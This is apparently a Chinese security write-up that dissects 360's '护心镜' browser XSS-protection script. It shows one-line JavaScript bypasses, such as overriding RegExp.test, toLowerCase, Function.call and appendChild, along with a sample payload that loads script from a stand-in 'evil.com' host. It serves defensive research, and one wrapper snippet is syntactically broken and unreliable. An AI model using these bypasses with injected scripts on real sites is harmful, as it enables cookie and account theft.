# 0x00 初识“护心镜”

------

官方介绍：

> 通过Hook XSS的常用函数,并监控DOM元素的创建,从而对整个页面的js行为进行监控。当发现页面中存在XSS攻击行为时,可根据预置的选项,进行放行,提醒用户选择,阻拦三种处理方式,同时预警中心会收到一次事件的告警,安全人员可根据告警进行应急响应处理。

在研究如何绕过一个系统之前，不急于直接读代码，先旁敲侧击看看这个系统大体都做了什么。

官方介绍中，在脚本加载前，需要执行一堆配置代码：

```
#!html
<script type="text/javascript">
var hxj_config = {
    project_key: "*****(平台分配)",
    domain_white: ["0kee.360.cn"],
    enable_plugin: {
      cookie: 1,
      xsstester: 1,
      password: 1,
      fish: 1,
      webshell: 1,
      script: 1
    }
};
</script>
<script type="text/javascript" src="http://res.0kee.com/hxj.min.js"></script>
```

“`project_key`” 不用说就是一个标识站点的key，“`domain_white`”和名字一样：白名单， 而“`enable_plugin`”表示了各个模块的开关。

通过http://res.0kee.com/hxj.min.js下载脚本，发现经过uglify-js的混淆压缩，将代码进行美化后对代码进行分析。

由于代码经过混淆，直接开看想必会有困难，在看代码之前，本想根据配置里的6大模块逐个分析，结果幸运的是，这个脚本并没有对自定属性名进行混淆，呈现如下：

```
#!js
...
}, s.Hook_CreateElement = function...
}, s.Hook_Image = function...
}, s.Hook_Source = function...
...
```

根据属性名＋配置文件的模块，可以看出护心镜主要实现了以下几个功能：

```
1. 对 XSS 经常用到的函数进行 HOOK，将传递进来的变量进行分析，是否有危险
2. 对页面中 JS 执行的代码进行“行为标记”
3. 加载外部资源时对域名进行白名单校验
4. 对危险行为产生报告向护心镜后台发送
5. 触发 XSS 或者加载外部 JS 时提示用户，是否进行拦截
```

举个例子：当一个 XSSer 对某后台进行盲打时，嵌入了一串代码：

```
#!html
<script src=//evil.com/evil.js></script>
```

当管理员登录后台时候触发了这串代码，由于加载了“evil.com”这个未知域名的 js 脚本，护心镜弹出危险警告，在用户确认后对脚本进行阻拦。

从之后的代码分析中了解，HOOK 函数实现了以下功能：

| 模块               | 功能                                               |
| :----------------- | :------------------------------------------------- |
| Hook_CreateElement | 对 CreateElement 方法进行 Hook                     |
| Hook_Image         | 对Image对象产生的实例进行 Setter 和 Getter 的 Hook |
| Hook_Source        | 对页面 DOM 进行监控，对新生成的标签进行来源检测    |
| Hook_Attribute     | 对元素的 setAttribute 方法进行 Hook                |
| Hook_Element       | 对元素的 Setter 和 Getter 进行 Hook                |
| Hook_Cookie        | 对 Cookie 的读写接口进行了 Hook                    |
| Hook_Xsstester     | 对常见的 alert、prompt 方法等进行 Hook             |
| Hook_CSRFWebshell  | 对通过 CSRF 上传 Webshell 进行拦截                 |
| Send               | 对护心镜接口发送报告                               |

# 0x02 快速寻找通杀之法

------

扫一遍代码，发现每个模块都有相应的弱点，但在那之前，

每个人都想知道快速通杀所有模块的方法，那么如何快速找到通杀方法？

最好的方式是看看他们有什么共通点：

（由于只有4个模块涉及拦截，那么就看看他们是怎么实现的）

```
+ Hook_CreateElement
  1. 重写document.createElement
  2. 重写createElement创建元素的setter和getter
  3. 对Setter进行tag（标签）匹配，然后通过Check_domain进行白名单匹配
  4. 通过confirm通知，确定是否拦截
+ Hook_Image
  1. 重写Image
  2. 重写new Image 对象的getter和setter
  3. Check_domain白名单匹配
  4. 通过confirm通知，确定是否拦截
  5. 若不拦截：通过this.setAttribute实现 Setter 的赋值
+ Hook_Source
  1. 通过 MutationObserver 对 DOM 进行监听
  2. 一旦 DOM 发生变化，对新增 Nodes（节点）进行校验
  3. 通过tag匹配和Check_domain白名单匹配
  4. 通过confirm通知，确定是否拦截
  5. 若拦截则删除该节点，否则放行
+ Hook_CSRFWebshell
  1. 重写 XMLHttpRequest.prototype.send
  2. 正则匹配白名单
  3. 通过confirm通知，确定是否拦截
```

第一眼能看到的共同点就是最后一步：通过confirm弹出通知框，让用户选择是否拦截。

假若直接重写confirm，使其永远都弹不出这个框，拦截自然也不会生效了！我们来试试：

```
#!js
Window.prototype.confirm = function () {return !1}
```

...遗憾的是，并没有成功改写，看来护心镜还是做过一些防绕过的。

这不经让人想到 defineProperty 这个方法。

果然，在脚本最后看到了这样一个方法`s.defConstProp(window, "confirm", confirm)`

看看 defConstProp 定义:

```
s.defConstProp = s.isWebkit ?
function(e, t, n) {
  Object.defineProperty(e, t, {
    value: n,
    configurable: !1,
    writable: !1,
    enumerable: !0
  })
} : function(e, t, n) {
  e[t] = n
};
```

通过 `Object.defineProperty` 将 `confirm` 进行了 `writeable = false` 的设置，这样一来便无法重写 `confirm` 了。

由于脚本中仅仅是对 `window` 的变量 `confirm` 进行重写，按理我们可以通过修改原型链上的 `Window.prototype.confirm` ,继而删除 `window.confirm`， 也可以达到同样的效果，但注意到 configurable 这个参数也是 false，也无法执行`delete confirm`了。

既然如此，只好另辟蹊径了。

我们来看看他们的第二个共同点：都经过一层字符串合法校验。

在 `Hook_CreateElement`、`Hook_Image`、`Hook_Source` 这三个模块中，都使用了 `Check_domain` 这个函数来检验 url 是否在白名单内

来看看 Check_domain 的定义：

```
#!js
s.Check_domain = function(e) {
  var t, n = !1;
  e = e.replace(/\s/g, ""), e = e.toLowerCase();
  if (e == s.white_tag || e.indexOf("://") == -1 || e.indexOf("chrome-extension://") == 0) return n = !0, n;
  for (var r = 0; r < s.domain_white.length; r++) {
    if (s.domain_white[r] == "" || s.domain_white[r].match(/[\!\@\#\$\%\^\&\?\>\<\|\{\}\[\]\(\)]/i)) continue;
    t = new RegExp("^http(|s)://([0-9a-zA-Z\\.]*\\.|)" + s.domain_white[r].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "(/|\\?|:\\d{0,5})", "i");
    if (t.test(e)) {
      n = !0;
      break
    }
  }
  return n
}
```

可以看到使用了 RegExp 的 test 方法进行了正则匹配，再看看 Hook_CSRFWebshell 这个模块：

```
#!js
s.prototype.Hook_CSRFWebshell = function(e) {
  if (!XMLHttpRequest) return;
  var t = ["CSRF_WEBSHELL", "CSRF_WEBSHELL:"];
  s.CSRFWEBSHELL_alert_level = e, XMLHttpRequest.prototype.send = function(e) {
    for (i in s.webshell_black) {
      var n = new RegExp(s.webshell_black[i], "i");
      if (n.test(unescape(e))) {
        s.Report_w(t[0]), s.Report_w(t[1]), s.Report(e.match(n)[0]);
        if (s.CSRFWEBSHELL_alert_level == 0) {
          s._ajaxsend.call(this, e);
          return
        }
        if (s.CSRFWEBSHELL_alert_level == 1 && !confirm("护心镜检测到网页正在向服务器上传危险文件（webshell），是否拦截？")) {
          s._ajaxsend.call(this, e);
          return
        }
      }
    }
    s._ajaxsend.call(this, e)
  }
}
```

首先重写了XMLHttpRequest原型对象的send方法，接着还是使用 RegExp.test 进行正则匹配。

如此，只要重写 RegExp 的 test 方法，使其永远返回 false，那么这些拦截代码就会全部失效了：

```
#!js
RegExp.prototype.test = function(){return !1}
```

这就是第一种绕过方式，仅一行代码，就让“【永别了,XSS攻击!】”的护心镜彻底失效了，看来想要根治 XSS 还任重道远。

当然了如果自己想要使用 test 方法的话，事先应该将该方法保存一下。

如果在绕过护心镜的同时，又不想破坏网站业务代码（毕竟 RegExp 经常被用到），那么可以扩充一下：

```
#!js
  _test = RegExp.prototype.test;
  RegExp.prototype.test = function (n) {
    n.slice(0, 4) === 'evil' && return _test.call(this, n);
    return !1;
  }
}
```

这样可以实现自定义规则对内容是否放行。

同样，在 `Hook_CreateElement`、`Hook_Image`、`Hook_Source` 这三个模块中，在进行白名单校验前， 会对 tag （html标签名：script、iframe等）进行匹配，若匹配不成功，则不会进入报警拦截流程， 代码如下（以Hook_Source为例）：

```
#!js
if (o.src || o.href || o.data)
  if (o.tagName 
    && (o.tagName.toLowerCase() == "frame"
      || o.tagName.toLowerCase() == "iframe"
      || o.tagName.toLowerCase() == "link"
      || o.tagName.toLowerCase() == "object"
      || o.tagName.toLowerCase() == "embed"
      || o.tagName.toLowerCase() == "img"
      || o.tagName.toLowerCase() == "source"
      || o.tagName.toLowerCase() == "video")) {
    //进入拦截流程...
  }
```

和劫持 `RegExp` 的做法相似，通过对 `toLowerCase` 方法的劫持，使其永远匹配不上正确的标签名，能达到同样的效果：

```
#!js
String.prototype.toLowerCase = function () {
  return 'never';
}
```

此为第二种绕法。

除了这四个拦截模块之外，还有 Hook_Cookie 等其他几个模块，这几个模块主要作用是记录最近的操作状态， 用于拦截模块对攻击进行分类，举个例子：

```
1. 当检测到有 Cookie 读取操作，最近状态列表中添加“读cookie操作”
2. 当 Image().src 向外部发送数据时，如果最近状态有“读cookie操作”，归类为偷取cookie行为
```

## 逐个击破小模块

除去以上的通杀方法，接下来看看如何用其他方法将这一个个模块逐个击破

### 1. 突破`Hook_Element`：其人之道还治其身

```
#!js
s.Hook_Element = function(e, t, n, r, i) {
  var o = ["FISH", "GET_PWD"];
  Object.defineProperty(e, t, {
    get: function() {
      return s.log("Get Attr"), (n == "R" || n == "RW" || n == "WR") && r(i), this.getAttribute(t)
    },
    set: function(e) {
      return s.log("Set Attr"), (n == "W" || n == "RW" || n == "WR") && r(i, e), this.setAttribute(t, e)
    }
  })
}
```

可以看到该函数可以重写元素的 set 和 get，并将行为记录，最后通过 `get/setAttibute` 的方法来实现，那么顺着脚本作者的方法， 通过 `get/setAttibute` 方法可直接绕过此类 Hook，这样的 Hook 在 `Image_Hook` 里也出现过。

### 2. 突破`Hook_Cookie`：更高效的读写Cookie

```
#!js
s.prototype.Hook_Cookie = function(e) {
  var t = ["GET_COOKIE", "SET_COOKIE"];
  s.Cookie_alert_level = e, Object.defineProperty(document, "cookie", {
    get: function() {
      s.Report(t[0]);
      var e = document.createElement("iframe");
      e.src = s.white_tag, document.documentElement.appendChild(e), e.contentDocument.write("null");
      var n = e.contentDocument.cookie;
      return document.documentElement.removeChild(e), n
    },
    set: function(e) {
      s.Report(t[1]);
      var n = document.createElement("iframe");
      return n.src = s.white_tag, document.documentElement.appendChild(n), n.contentDocument.write("null"), n.contentDocument.cookie = e, document.documentElement.removeChild(n), e
    }
  })
}
```

从代码中可以看出，使用了从 iframe 中读写 Cookie 来实现 钩子函数中的 cookie 操作，和第一个钩子的绕过方式相同，

直接利用作者的方法，使用 iframe 操作 cookie 就可以绕过钩子函数了（事实上，经常可以护心镜自己的代码逻辑绕过自身）。

当然了，这么写及其影响页面性能，使用了护心镜后，每一次有关 cookie 的操作都要在页面中创建 iframe、删除 iframe，不断如此。

其实可以通过如下方法直接获取 cookie 的读写接口：

```
#!js
Document.prototype.__lookupGetter__('cookie');
Document.prototype.__lookupSetter__('cookie');
```

### 3. 突破`Hook_Attribute`：原始接口招之即来

```
#!js
s.prototype.Hook_Attribute = function() {
    var e = ["setAttrib", "getAttrib", "FISH", "GET_PWD", "IMG.SRC:"];
    window.Element.prototype.setAttribute = function(t, n) {
      if (!isNaN(n) || n == s.white_tag || n.indexOf(s.report_uri) == 0 || n.indexOf(s.report_times_uri) == 0) {
        s._setAttribute.call(this, t, n);
        return
      }
      s.Report_w(e[0]), s.log("setAttrib"), s.log(n);
      if (this.tagName && t == "type" && this.tagName.toLowerCase() == "input") s.log("modify type"), s.Report_w(e[3]);
      else if (this.tagName && t == "src") {
        if (this.tagName.toLowerCase() == "img")
          s.log("SET SRC:" + n),
          n.indexOf("?") > 0 && !s.Check_domain(n) && n.split("?")[1].length > s.cookie_maxlen && s.Report(n);
      }
      else if (this.tagName.toLowerCase() == "frame" || this.tagName.toLowerCase() == "iframe") s.log("Frame src:" + n), s.Report_w("M_IFRAME_SRC");
      s._setAttribute.call(this, t, n)
    }, window.Element.prototype.getAttribute = function(t) {
      return s.log("getAttrib"), s.Hookpwd_tag && this.tagName && t == "value" && this.tagName.toLowerCase() == "input" && (s.log("getattr pwd"), s.Report_w(e[3])), s._getAttribute.call(this, t)
    }
```

将setAttibute方法重写了，可以看到代码中不断出现`toLowerCase`和`Check_domain`（你懂得），当然我们可以把原始接口再一次拿出来，

覆盖当前被 Hook 的 setAttribute 和 getAttibute。

```
#!js
Function.prototype.call = function () {
  if (this.name === 'setAttribute')
    HTMLElement.prototype.setAttribute = this;//还原了原始接口setAttribute
  else if (this.name === 'getAttribute')
    HTMLElement.prototype.getAttribute = this;//还原了原始接口getAttribute
}
```

这样就能获得纯天然无公害的 `setAttribute` 和 `getAttribute` 了 ：）

### 4. 突破`Hook_Xsstester`：妈妈再也不用担心我到处 alert 了

```
#!js
s.prototype.Hook_Xsstester = function() {
  function t(e) {
    if (typeof e == "object") return !0;
    var t = new RegExp("(^(\\d)*$|^xss$|[[\\w\\_\\-\\|\\.\\%]*=[\\w\\_\\-\\|\\.\\%]*\\;]*|" + location.href + "|" + document.domain + "|" + document.cookie + ")", "i");
    return t.test(e)
  }
  var e = "XSS_TEST:";
  alert = function(n) {
    return t(n) && (s.log("XSS Test:alert"), s.Report_w(e), s.Report(escape(n))), s._alert.call(this, n)
  }, confirm = function(n) {
    return n.indexOf("护心镜") > -1 ? s._confirm.call(this, n) : (t(n) && (s.log("XSS Test:confirm"), s.Report_w(e), s.Report(escape(n))), s._confirm.call(this, n))
  }, prompt = function(n) {
    return t(n) && (s.log("XSS Test:prompt"), s.Report_w(e), s.Report(escape(n))), s._prompt.call(this, n)
  }
}
```

Xsstester 就是用于记录 Xsser 常用的 alert、prompt 等测试方法的，原理同样是重写了这两个函数。

但是护心镜这里出现了两个重大失误，没有考虑到以下两个常见情况：

1. `alert(/xss/)`，Xsser 常用正则进行测试
2. `alert('test')`，Xsser 用自定字符串进行测试

至于绕过，其实绕过 Xsstester 很简单，由于重写了 window.alert 等函数，通过原型链上的 alert 可以轻易获取和还原原始方法。

```
#!js
Window.prototype.alert;
```

### 5. 突破`Send`： 阻止发送一切报告

```
#!js
s.Send = function(e) {
  var t = e,
    n = "xHxOxOxKx";
  t = s.report_uri + "?f=" + escape(t), t = t + "&id=" + s.user_token, t = t + "&callback=" + s.callback_name;
  if (document.body) {
    document.getElementById(n) && document.getElementById(n).parentElement.removeChild(document.getElementById(n));
    var r = document.createElement("script");
    r.src = t, r.id = n, document.body.appendChild(r)
  } else window.onload = new function() {
    document.getElementById(n) && document.documentElement.removeChild(document.getElementById(n));
    var e = document.createElement("script");
    e.src = t, e.id = n, document.documentElement.appendChild(e)
  }
}
```

代码中使用创建 script 来发送报告，那么重写 appendChild 就可以阻挡发送报告了：

```
#!js
HTMLElement.prototype.appendChild = function (){return !1}
```

当然，实际使用最好不要这么简单粗暴（容易误伤正常代码），稍微润色一下无伤大雅。

# 0x03 总结

------

- 针对护心镜的防护，在引入攻击代码前，加一小句代码即可绕过。
- 即便如此，护心镜还是很有价值的，毕竟不是每一个攻击者都是有心人。
- 目前的脚本还待改善，文中提出的几点再提一次：
  - 性能优化，比如：cookie读写。
  - 从原型链上开始 Hook。
  - 使用其他方式实现原生方法 == 不需要绕过，比如：用 setAttribute 实现 set、用 iframe 实现 cookie 操作。
- 安全攻防的战场不知何时已经从后端转向了前端，但不变的是：安全防护技术总是在不断尝试和绕过中提升。